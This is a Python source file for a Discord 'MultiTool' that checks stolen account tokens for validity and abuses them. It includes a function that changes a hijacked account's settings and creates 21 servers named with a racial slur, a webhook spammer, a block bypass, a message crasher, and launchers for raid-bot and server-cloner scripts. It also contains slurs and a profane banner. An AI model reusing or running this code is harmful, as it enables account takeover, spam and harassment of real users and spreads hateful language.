import os
from selenium import webdriver
import requests
import json as js2,threading
import websocket
import json
import asyncio
import getpass
import aiosonic
import names
import subprocess
import sys
import time
import re
import threading
from threading import Thread
from tasksio import TaskPool
from colorama import init, Fore, Back, Style
from itertools import cycle
import random
from subprocess import call
import os.path
import ctypes
from pystyle import Anime, Colorate, Colors, Center, System

os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW("Aquarium MultiTool - BETA")

banner = Fore.CYAN + """




                      █████╗  ██████╗ ██╗   ██╗ █████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗
                     ██╔══██╗██╔═══██╗██║   ██║██╔══██╗██╔══██╗██║██║   ██║████╗ ████║
                     ███████║██║   ██║██║   ██║███████║██████╔╝██║██║   ██║██╔████╔██║
                     ██╔══██║██║▄▄ ██║██║   ██║██╔══██║██╔══██╗██║██║   ██║██║╚██╔╝██║
                     ██║  ██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
                     ╚═╝  ╚═╝ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
                                                                   
                                                Fuck Villalas                                       
"""

def deletewebhook(url):
	return requests.delete(url)




threads = []

TOKENS_LOADED = 0
TOKENS_INVALID = 0
TOKENS_LOCKED = 0
TOKENS_VALID = 0
TOKENS_VALID_LIST = []


def filter_tokens(unfiltered):
    tokens = []
    
    for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
            for token in re.findall(regex, line):
                if token not in tokens:
                    tokens.append(token)
    return tokens

def title_worker():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED
    while True:
        time.sleep(0.1)


threading.Thread(target=title_worker, daemon=True).start()

async def check(token, client):
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_VALID_LIST
    
    response = await client.get("https://discord.com/api/v9/users/@me/guild-events", headers={
        "Authorization": token,
        "Content-Type": "application/json"
    })
    
    if response.status_code == 200:
        TOKENS_VALID += 1
        TOKENS_VALID_LIST.append(token)
        print(f'{Fore.MAGENTA}[VALID] {token}')
            
    elif response.status_code == 401:      
        TOKENS_INVALID += 1
        print(f'{Fore.RED}[INVALID] {token}')
        
    elif response.status_code == 403:
        TOKENS_LOCKED += 1
        print(f'{Fore.LIGHTYELLOW_EX}[LOCKED] {token}')

def leave(guild_id, token):
    data = {"lurking": False}
    headers = {
        "Authorization":
        token,
        "accept":
        "*/*",
        "accept-language":
        "en-US",
        "connection":
        "keep-alive",
        "cookie":
        f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT":
        "1",
        "origin":
        "https://discord.com",
        "sec-fetch-dest":
        "empty",
        "sec-fetch-mode":
        "cors",
        "sec-fetch-site":
        "same-origin",
        "referer":
        "https://discord.com/channels/@me",
        "TE":
        "Trailers",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties":
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    requests.delete("https://discord.com/api/v9/users/@me/guilds/" + str(guild_id), json=data, headers=headers)

def rape(token):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
  }
    guild = {
    'channels': None,
    'icon': None,
    'name': "nigger",
    'region': "europe"
} 
    payload = {
    'message_display_compact': False,
    'inline_attachment_media': False,
    'inline_embed_media': False,
    'gif_auto_play': False,
    'theme': 'light',
    'render_embeds': False,
    'animate_emoji': False,
    'convert_emoticons': False,
    'locale': "zh-TW",
    'render_reactions': False,
    'enable_tts_command': False,
    'explicit_content_filter': '0',
    'status': "idle"
  }
    request = requests.Session()
    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
    for i in range(21):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
async def maincheck():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED, TOKENS_VALID_LIST
    
    client = aiosonic.HTTPClient()
    
    try:
        with open('tokens.txt', 'r') as tokens:
            filtered = filter_tokens(tokens)
            TOKENS_LOADED = len(filtered)
            async with TaskPool(10_000) as pool:
                for token in filtered:
                    await pool.put(check(token, client))

            print(f"{Fore.WHITE}Tokens Loaded: {TOKENS_LOADED} | Valid: {TOKENS_VALID} | Locked: {TOKENS_LOCKED} | Invalid: {TOKENS_INVALID}")    
            
            with open(f'valid.txt', 'w') as handle:
                handle.write('\n'.join(TOKENS_VALID_LIST))
                handle.close()
                
            input("Saved to valid.txt, click enter to exit.")
                      
    except Exception as e:
        print(e)
        input('Can\'t open tokens.txt\nClick enter to exit!')

def sendMessage(message):
        request = requests.post(f'{api}channels/{channelId}/messages', json={'content': message}, headers=headersi)

def main():
    content = input('[Message To Send] -> ')

    sendMessage(content)

def randstr(lenn) :
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0,lenn): 
        text += alpha[random.randint(0,len(alpha)-1)]

    return text

pool_sema = threading.Semaphore(value=30)





def join(invite, token):
    headers = {
        "Authorization":
        token,
        "accept":
        "*/*",
        "accept-language":
        "en-US",
        "connection":
        "keep-alive",
        "cookie":
        f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT":
        "1",
        "origin":
        "https://discord.com",
        "sec-fetch-dest":
        "empty",
        "sec-fetch-mode":
        "cors",
        "sec-fetch-site":
        "same-origin",
        "referer":
        "https://discord.com/channels/@me",
        "TE":
        "Trailers",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties":
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

user = getpass.getuser()
while True:
    print(banner)
    print(f"""\n
                                             {Fore.BLUE}[{Fore.WHITE}1{Fore.BLUE}]{Fore.WHITE} Delete Webhook    
                                             {Fore.BLUE}[{Fore.WHITE}2{Fore.BLUE}]{Fore.WHITE} 2K Characters Bypass
                                             {Fore.BLUE}[{Fore.WHITE}3{Fore.BLUE}]{Fore.WHITE} Block Bypass           
                                             {Fore.BLUE}[{Fore.WHITE}4{Fore.BLUE}]{Fore.WHITE} Hypesquad Changer
                                             {Fore.BLUE}[{Fore.WHITE}5{Fore.BLUE}]{Fore.WHITE} Webhook Spammer                
                                             {Fore.BLUE}[{Fore.WHITE}6{Fore.BLUE}]{Fore.WHITE} Other Tools""")
    choice = input("@FGconsole $: ")
    if choice == '1':
        webhook = input("Webhook URL: ")
        deletewebhook(webhook)
    elif choice == "2":
        skata = input("Token: ")
        channel_id = input("Channel ID: ")
        chars = ''.join(random.choice('\'"^`|{}') for _ in range(1993))
        lmaoheader = {'Authorization': skata}
        requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=lmaoheader, json={'content': f'<a://a{chars}>'})
    elif choice == "3":
        api = 'https://discord.com/api/v8/'
        tokensat = input('Token -> ')
        userId = input('UserId to Message -> ')
        headersi = {
            'Authorization': tokensat,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
        }
        requesta = requests.post(f'{api}users/@me/channels', json={'recipients': [ userId ]}, headers=headersi)
        channelId = requesta.json()['id']
        main()
    elif choice == "4":
        hypetoken = input("Token: ")
        print("1 - Bravery\n2 - Brilliance\n3 - Balance")
        hypesquad = input("Choice: ")

        headersosat = {
        'Authorization': str(hypetoken)
        }

        payloadsosat = {
    'house_id': str(hypesquad)
        }

        rep = requests.session().post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headersosat)
    elif choice == "5":
        actual = input("Webhook URL: ")
        msg = input("Message: ")
        for x in range(100):
            sendwebhook = requests.post(actual, json={'content': msg})
    elif choice == "6":
     os.system('cls')

     def main_menu():
      print(f"""
{Fore.BLUE}-----{Fore.WHITE}( Config ){Fore.BLUE}----{Fore.RESET}
{Fore.WHITE}[{Fore.BLUE}1{Fore.WHITE}]{Fore.BLUE} Config Your token
{Fore.BLUE}-----{Fore.WHITE}( Tools ){Fore.BLUE}----{Fore.RESET}
{Fore.WHITE}[{Fore.BLUE}2{Fore.WHITE}]{Fore.BLUE} Raid Bot
{Fore.WHITE}[{Fore.BLUE}3{Fore.WHITE}]{Fore.BLUE} Cloner
    """)

    def tool_2():
        token = input("Token: ")
        prefix = input("Prefix: ")
        channel_names = input("Channel names: ")
        role_names = input("Role names: ")
        message_content = input("Message content: ")

        try:
            file_path = os.path.join('utilities', 'other', 'simplebotraid', 'config_bot.json')
            with open(file_path, 'w') as archive:
                config = {
                      "token": token,
                      "prefix": prefix,
                      "channel_names": channel_names,
                      "role_names": role_names,
                      "message_content": message_content
                }
                json.dump(config, archive, indent=2)
                print("Config saved successfully")
            call(["python", "utilities/other/simplebotraid/raid.py"])
        except Exception as e:
             print(f"Error saving config: {e}")         

    def tool_3():
      try:
        call(["python", "utilities/other/Cloner/main.py"])
      except Exception as e:
        print(f"Error: {e}")

# Bucle principal
    while True:
     print(banner)
     main_menu()
     choice = input("@FGconsole $: ")

     if choice == '1':
        token = input("Token: ")
        with open('config.json', 'w') as f:
            f.write('''{
    "token": "%s",
    "password": "",
    "prefix": "$",
    "nitro_sniper": false
}

''' % (token))
     elif choice == "2":
        tool_2()
     elif choice == "3":
        tool_3()
     else:
        print("Invalid choice")

     input("Press Enter to continue...")
     os.system('cls')    